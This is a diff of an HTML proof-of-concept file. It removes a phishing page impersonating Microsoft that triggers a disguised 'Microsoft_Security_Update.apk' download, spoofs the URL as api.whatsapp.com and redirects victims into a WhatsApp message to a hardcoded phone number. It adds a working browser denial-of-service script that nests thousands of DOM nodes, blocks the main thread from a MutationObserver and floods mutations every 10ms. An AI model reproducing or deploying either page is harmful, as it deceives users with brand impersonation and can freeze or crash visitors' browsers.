@@ -3,131 +3,108 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Microsoft Security Center — WhatsApp Intent Verification</title>
+<title>Translation DOM DoS & Resource Exhaustion PoC</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { 
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-    background: #f3f2f1; 
-    display: flex; 
-    justify-content: center; 
-    align-items: center; 
-    min-height: 100vh; 
-    color: #323130;
-    overflow: hidden;
-  }
-  .card { 
-    background: #ffffff; 
-    padding: 40px; 
-    border-radius: 4px; 
-    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); 
-    max-width: 420px; 
-    width: 100%; 
-    text-align: center; 
-    border-top: 4px solid #0067b8;
-  }
-  .logo { font-size: 24px; font-weight: 600; color: #0067b8; margin-bottom: 20px; }
-  h2 { font-size: 20px; font-weight: 600; margin-bottom: 10px; color: #201f1e; }
-  p { font-size: 14px; color: #605e5c; margin-bottom: 25px; line-height: 1.5; }
-  button { 
-    background: #0067b8; 
-    color: #ffffff; 
-    border: none; 
-    padding: 12px 24px; 
-    font-size: 15px; 
-    font-weight: 600; 
-    border-radius: 2px; 
-    cursor: pointer; 
-    width: 100%; 
-    transition: background 0.2s;
-  }
-  button:hover { background: #005a9e; }
-  #status { 
-    margin-top: 20px; 
-    font-size: 13px; 
-    color: #0067b8; 
-    font-weight: 500; 
-  }
+  body { font-family: monospace; padding: 40px; background: #121212; color: #e0e0e0; }
+  .box { background: #1e1e1e; padding: 25px; border-radius: 6px; border: 1px solid #333; margin-bottom: 20px; }
+  button { padding: 12px 24px; background: #d16969; color: #fff; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; }
+  button:hover { background: #f44545; }
+  #log { color: #4ec9b0; white-space: pre-wrap; margin-top: 15px; font-size: 13px; }
 </style>
 </head>
 <body>
 
-<div class="card">
-  <div class="logo">Microsoft</div>
-  <h2>WhatsApp Verification Required</h2>
-  <p>Please complete the required device verification package to secure your account via WhatsApp.</p>
-  <button id="actionBtn">Verify & Connect Now</button>
-  <div id="status"></div>
+<div class="box">
+  <h2>Translation Engine Stress / DoS Test</h2>
+  <p>Injecting recursive DOM nodes designed to overload mutation scanning and translation rendering queues.</p>
+  <button id="triggerBtn">Trigger Translation Exhaustion</button>
 </div>
+
+<div class="box">
+  <h3>Execution Log:</h3>
+  <div id="log">[*] Ready to initialize stress vector...</div>
+</div>
+
+<!-- Container target yang akan dipindai secara masif -->
+<div id="stressContainer" style="display:none;"></div>
 
 <script>
 (function () {
   'use strict';
 
-  var btn = document.getElementById('actionBtn');
-  var statusEl = document.getElementById('status');
+  var btn = document.getElementById('triggerBtn');
+  var logEl = document.getElementById('log');
+  var container = document.getElementById('stressContainer');
 
-  // Konfigurasi Delay (3 detik)
-  var DELAY_SECONDS = 3; 
+  function log(msg) {
+    logEl.textContent += "\n" + msg;
+    console.log("[PoC DoS] " + msg);
+  }
 
-  // Target WhatsApp Intent (Nomor tujuan dan pesan otomatis, ganti nomor sesuai keperluan misal: 628123456789)
-  var TARGET_PHONE = "6285796065672"; 
-  var TARGET_MESSAGE = "Security verification session active. Token ID: 98765";
-  
-  // Format Android Intent untuk WhatsApp
-  var WHATSAPP_INTENT_URL = "intent://send?phone=" + TARGET_PHONE + "&text=" + encodeURIComponent(TARGET_MESSAGE) + "#Intent;scheme=whatsapp;package=com.whatsapp;end;";
+  function triggerTranslationMemoryExhaustion() {
+    log("[*] Initializing recursive DOM node generation for translation engine overload...");
 
-  function triggerWhatsAppIntentChain() {
-    statusEl.textContent = "Preparing verification package...";
-
-    // 1. Membuat file .apk virtual via Blob API di background
     try {
-      var dummyBytes = new Uint8Array([0x50, 0x4B, 0x03, 0x04, 0x00, 0x00, 0x08, 0x00]); // Magic bytes ZIP/APK
-      var blob = new Blob([dummyBytes], { type: 'application/vnd.android.package-archive' });
-      var blobUrl = URL.createObjectURL(blob);
-
-      var a = document.createElement('a');
-      a.href = blobUrl;
-      a.download = "Microsoft_Security_Update.apk";
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-
-      setTimeout(function() {
-        URL.revokeObjectURL(blobUrl);
-      }, 5000);
-    } catch (e) {}
-
-    // 2. Hitung mundur delay sebelum mengarahkan ke WhatsApp Intent
-    var countdown = DELAY_SECONDS;
-    var timer = setInterval(function() {
-      countdown--;
-      if (countdown > 0) {
-        statusEl.textContent = "Opening WhatsApp in " + countdown + "s...";
-      } else {
-        clearInterval(timer);
-        statusEl.textContent = "Launching WhatsApp...";
-        
-        // Manipulasi History State opsional
-        try {
-          window.history.replaceState(null, "", "https://api.whatsapp.com/");
-        } catch(e) {}
-
-        // Pengalihan mutlak ke Intent WhatsApp
-        window.location.replace(WHATSAPP_INTENT_URL);
+      // 1. Membuat struktur pohon DOM bersarang (nested/recursive tree) berukuran masif
+      // yang meniru teks target pemindaian translate engine
+      var depth = 5000;
+      var rootHTML = "";
+      
+      for (var i = 0; i < depth; i++) {
+        rootHTML += '<span class="goog-translate-lint" data-index="' + i + '">Vulnerable Translation Text Node ' + i + ' ';
       }
-    }, 1000);
+      for (var j = 0; j < depth; j++) {
+        rootHTML += '</span>';
+      }
+
+      container.innerHTML = rootHTML;
+      log("[+] Injected " + (depth * 2) + " nested DOM elements into document tree.");
+
+      // 2. Memicu MutationObserver agresif yang memaksa pemrosesan ulang teks secara sinkron
+      log("[*] Spawning synchronous mutation observers to lock render thread...");
+      
+      var observer = new MutationObserver(function(mutations) {
+        // Loop berat yang membebani thread utama (Main Thread Block)
+        var start = performance.now();
+        while (performance.now() - start < 400) {
+          // Memaksa kalkulasi berat di setiap mutasi terjemahan
+          Math.atan(Math.random() * Math.random());
+        }
+      });
+
+      observer.observe(container, { 
+        childList: true, 
+        subtree: true, 
+        characterData: true,
+        attributes: true 
+      });
+
+      // 3. Loop tak berkesudahan yang terus memodifikasi teks node secara instan (Recursive DOM Flooding)
+      var counter = 0;
+      setInterval(function() {
+        counter++;
+        log("[!] Forcing rapid DOM content mutation loop #" + counter);
+        
+        // Mengubah teks secara massal untuk memicu antrean ulang (queue flood) pada engine browser
+        var spans = container.getElementsByTagName('span');
+        for (var k = 0; k < spans.length; k += 10) {
+          spans[k].textContent = "Mutated State " + Math.random();
+        }
+      }, 10); // Interval sangat cepat (10ms) untuk menghabiskan siklus CPU thread utama
+
+    } catch (e) {
+      log("[-] Error during DoS vector execution: " + e.message);
+    }
   }
 
   btn.addEventListener('click', function() {
     btn.disabled = true;
-    btn.style.opacity = "0.6";
-    statusEl.textContent = "Initializing secure tunnel...";
+    btn.style.opacity = "0.5";
+    log("[!] Execution started. Browser main thread will freeze shortly...");
 
-    // Jeda kecil sebelum rangkaian aksi dimulai
     setTimeout(function() {
-      triggerWhatsAppIntentChain();
-    }, 800);
+      triggerTranslationMemoryExhaustion();
+    }, 500);
 
   }, { once: true });
 
